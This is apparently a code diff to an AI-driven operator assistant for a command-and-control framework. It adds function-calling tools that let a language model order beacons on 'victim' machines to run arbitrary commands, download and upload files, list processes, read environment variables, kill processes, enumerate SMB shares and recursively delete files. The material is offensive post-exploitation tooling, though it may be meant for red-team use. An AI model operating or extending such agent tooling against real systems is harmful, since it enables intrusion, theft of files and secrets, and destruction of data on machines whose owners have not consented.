@@ -391,6 +391,255 @@ You also point out security gaps that could be leveraged. You understand operati
             }
         }
 
+        function_spec_download = {
+            "name": "download",
+            "description": (
+                "Retrieve a file from the victim's machine and save it to the operator's machine. "
+                "Large files are split into 2MB chunks and transferred over multiple check-ins."
+            ),
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "beacon_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the beacon to execute the command on"
+                    },
+                    "listener_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the listener at which the beacon is connected"
+                    },
+                    "remote_path": {
+                        "type": "string",
+                        "description": "Full path of the file on the victim machine to download"
+                    },
+                    "local_path": {
+                        "type": "string",
+                        "description": "Destination path on the operator machine where the file should be stored"
+                    }
+                },
+                "required": ["beacon_hash", "listener_hash", "remote_path", "local_path"]
+            }
+        }
+
+        function_spec_upload = {
+            "name": "upload",
+            "description": (
+                "Transfer a file from the operator's machine to the victim's machine, writing the data to the specified remote path."
+            ),
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "beacon_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the beacon to execute the command on"
+                    },
+                    "listener_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the listener at which the beacon is connected"
+                    },
+                    "local_path": {
+                        "type": "string",
+                        "description": "Full path to the file on the operator machine that should be sent"
+                    },
+                    "remote_path": {
+                        "type": "string",
+                        "description": "Destination path on the victim machine where the file will be written"
+                    }
+                },
+                "required": ["beacon_hash", "listener_hash", "local_path", "remote_path"]
+            }
+        }
+
+        function_spec_enumerate_shares = {
+            "name": "enumerateShares",
+            "description": "List available SMB shares, optionally targeting a specific host.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "beacon_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the beacon to execute the command on"
+                    },
+                    "listener_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the listener at which the beacon is connected"
+                    },
+                    "host": {
+                        "type": "string",
+                        "description": "Optional remote host to enumerate; defaults to the current machine",
+                        "default": ""
+                    }
+                },
+                "required": ["beacon_hash", "listener_hash"]
+            }
+        }
+
+        function_spec_get_env = {
+            "name": "getEnv",
+            "description": "List environment variables available to the beacon process.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "beacon_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the beacon to execute the command on"
+                    },
+                    "listener_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the listener at which the beacon is connected"
+                    }
+                },
+                "required": ["beacon_hash", "listener_hash"]
+            }
+        }
+
+        function_spec_ip_config = {
+            "name": "ipConfig",
+            "description": "Display local IP configuration details for the host running the beacon.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "beacon_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the beacon to execute the command on"
+                    },
+                    "listener_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the listener at which the beacon is connected"
+                    }
+                },
+                "required": ["beacon_hash", "listener_hash"]
+            }
+        }
+
+        function_spec_kill_process = {
+            "name": "killProcess",
+            "description": "Terminate a process on the victim machine by its PID.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "beacon_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the beacon to execute the command on"
+                    },
+                    "listener_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the listener at which the beacon is connected"
+                    },
+                    "pid": {
+                        "type": "integer",
+                        "description": "Process identifier to terminate"
+                    }
+                },
+                "required": ["beacon_hash", "listener_hash", "pid"]
+            }
+        }
+
+        function_spec_list_processes = {
+            "name": "listProcesses",
+            "description": "List running processes, including PID, name, and owner on the victim machine.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "beacon_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the beacon to execute the command on"
+                    },
+                    "listener_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the listener at which the beacon is connected"
+                    }
+                },
+                "required": ["beacon_hash", "listener_hash"]
+            }
+        }
+
+        function_spec_netstat = {
+            "name": "netstat",
+            "description": "Show active network connections from the beacon host.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "beacon_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the beacon to execute the command on"
+                    },
+                    "listener_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the listener at which the beacon is connected"
+                    }
+                },
+                "required": ["beacon_hash", "listener_hash"]
+            }
+        }
+
+        function_spec_remove = {
+            "name": "remove",
+            "description": "Delete a file or directory recursively on the victim machine.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "beacon_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the beacon to execute the command on"
+                    },
+                    "listener_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the listener at which the beacon is connected"
+                    },
+                    "path": {
+                        "type": "string",
+                        "description": "Path to the file or directory to remove"
+                    }
+                },
+                "required": ["beacon_hash", "listener_hash", "path"]
+            }
+        }
+
+        function_spec_run = {
+            "name": "run",
+            "description": (
+                "Execute a system command on the victim host and capture its stdout and stderr output."
+            ),
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "beacon_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the beacon to execute the command on"
+                    },
+                    "listener_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the listener at which the beacon is connected"
+                    },
+                    "command": {
+                        "type": "string",
+                        "description": "Command line to execute on the victim machine"
+                    }
+                },
+                "required": ["beacon_hash", "listener_hash", "command"]
+            }
+        }
+
+        function_spec_whoami = {
+            "name": "whoami",
+            "description": "Print the current user context and group membership of the beacon process.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "beacon_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the beacon to execute the command on"
+                    },
+                    "listener_hash": {
+                        "type": "string",
+                        "description": "The unique hash identifying the listener at which the beacon is connected"
+                    }
+                },
+                "required": ["beacon_hash", "listener_hash"]
+            }
+        }
+
         return [
             function_spec_loadmodule,
             function_spec_ls,
@@ -398,6 +647,17 @@ You also point out security gaps that could be leveraged. You understand operati
             function_spec_cat,
             function_spec_pwd,
             function_spec_tree,
+            function_spec_download,
+            function_spec_upload,
+            function_spec_enumerate_shares,
+            function_spec_get_env,
+            function_spec_ip_config,
+            function_spec_kill_process,
+            function_spec_list_processes,
+            function_spec_netstat,
+            function_spec_remove,
+            function_spec_run,
+            function_spec_whoami,
         ]
 
 
@@ -494,6 +754,24 @@ You also point out security gaps that could be leveraged. You understand operati
             self.printInTerminal("Analysis:", error_message)
 
 
+    def _quote_argument(self, value):
+        if value is None:
+            return '""'
+
+        text = str(value)
+        if not text:
+            return '""'
+
+        if text.startswith('"') and text.endswith('"') and len(text) >= 2:
+            return text
+
+        if any(ch.isspace() for ch in text) or '"' in text:
+            escaped = text.replace('"', '\\"')
+            return f'"{escaped}"'
+
+        return text
+
+
     def _handle_function_call(self, message):
         role = message.get("role") if isinstance(message, dict) else None
         content = message.get("content") if isinstance(message, dict) else None
@@ -552,15 +830,43 @@ You also point out security gaps that could be leveraged. You understand operati
 
 
     def executeCmd(self, cmd, args):
-        supported_commands = {"loadModule", "ls", "tree", "cd", "cat", "pwd"}
+        supported_commands = {
+            "loadModule",
+            "ls",
+            "tree",
+            "cd",
+            "cat",
+            "pwd",
+            "download",
+            "upload",
+            "enumerateShares",
+            "getEnv",
+            "ipConfig",
+            "killProcess",
+            "listProcesses",
+            "netstat",
+            "remove",
+            "run",
+            "whoami",
+        }
         if cmd not in supported_commands:
             raise ValueError(f"Unsupported command type: {cmd}")
 
         required_keys = ["beacon_hash", "listener_hash"]
-        if cmd == "module_to_load":
+        if cmd == "loadModule":
             required_keys.append("module_to_load")
         elif cmd == "ls" or cmd == "cd" or cmd == "cat" or cmd == "tree":
             required_keys.append("path")
+        elif cmd == "download":
+            required_keys.extend(["remote_path", "local_path"])
+        elif cmd == "upload":
+            required_keys.extend(["local_path", "remote_path"])
+        elif cmd == "killProcess":
+            required_keys.append("pid")
+        elif cmd == "remove":
+            required_keys.append("path")
+        elif cmd == "run":
+            required_keys.append("command")
 
         missing = [key for key in required_keys if key not in args]
         if missing:
@@ -576,7 +882,55 @@ You also point out security gaps that could be leveraged. You understand operati
             command_line = f"{cmd} {module_to_load}"
         elif cmd == "ls" or cmd == "cd" or cmd == "cat" or cmd == "tree":
             path = args["path"]
-            command_line = f"{cmd} {path}"
+            command_line = f"{cmd} {self._quote_argument(path)}"
+        elif cmd == "download":
+            remote_path = str(args["remote_path"])
+            local_path = str(args["local_path"])
+            if not remote_path.strip() or not local_path.strip():
+                raise ValueError("remote_path and local_path must not be empty")
+            command_line = (
+                f"download {self._quote_argument(remote_path.strip())} {self._quote_argument(local_path.strip())}"
+            )
+        elif cmd == "upload":
+            local_path = str(args["local_path"])
+            remote_path = str(args["remote_path"])
+            if not local_path.strip() or not remote_path.strip():
+                raise ValueError("local_path and remote_path must not be empty")
+            command_line = (
+                f"upload {self._quote_argument(local_path.strip())} {self._quote_argument(remote_path.strip())}"
+            )
+        elif cmd == "enumerateShares":
+            host = str(args.get("host", "")).strip()
+            if host:
+                command_line = f"enumerateShares {self._quote_argument(host)}"
+            else:
+                command_line = "enumerateShares"
+        elif cmd == "getEnv":
+            command_line = "getEnv"
+        elif cmd == "ipConfig":
+            command_line = "ipConfig"
+        elif cmd == "killProcess":
+            pid_value = args["pid"]
+            pid_str = str(pid_value).strip()
+            if not pid_str:
+                raise ValueError("pid must not be empty")
+            command_line = f"killProcess {pid_str}"
+        elif cmd == "listProcesses":
+            command_line = "ps"
+        elif cmd == "netstat":
+            command_line = "netstat"
+        elif cmd == "remove":
+            path = str(args["path"])
+            if not path.strip():
+                raise ValueError("path must not be empty")
+            command_line = f"remove {self._quote_argument(path.strip())}"
+        elif cmd == "run":
+            command = str(args["command"]).strip()
+            if not command:
+                raise ValueError("command must not be empty")
+            command_line = f"run {command}"
+        elif cmd == "whoami":
+            command_line = "whoami"
 
         command = TeamServerApi_pb2.Command(
             beaconHash=beacon_hash,
